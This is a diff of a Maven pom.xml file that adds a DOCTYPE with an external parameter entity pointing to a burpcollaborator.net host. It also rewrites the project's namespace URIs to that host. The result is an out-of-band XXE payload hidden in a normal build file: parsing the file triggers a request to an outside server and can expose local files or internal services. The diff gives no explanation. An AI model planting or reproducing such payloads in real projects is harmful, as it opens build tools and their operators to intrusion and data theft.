@@ -1,4 +1,8 @@
 <?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+<!ENTITY % ext SYSTEM "http://alpha.v84lewqexklqy6597cm77vco0f65uu.burpcollaborator.net/x"> %ext;
+]>
+<r></r>
 <project xmlns="http://alpha.v84lewqexklqy6597cm77vco0f65uu.burpcollaborator.net/" xmlns:xsi="http://alpha.v84lewqexklqy6597cm77vco0f65uu.burpcollaborator.net/"
     xsi:schemaLocation="http://alpha.v84lewqexklqy6597cm77vco0f65uu.burpcollaborator.net/">
     <modelVersion>4.0.0</modelVersion>
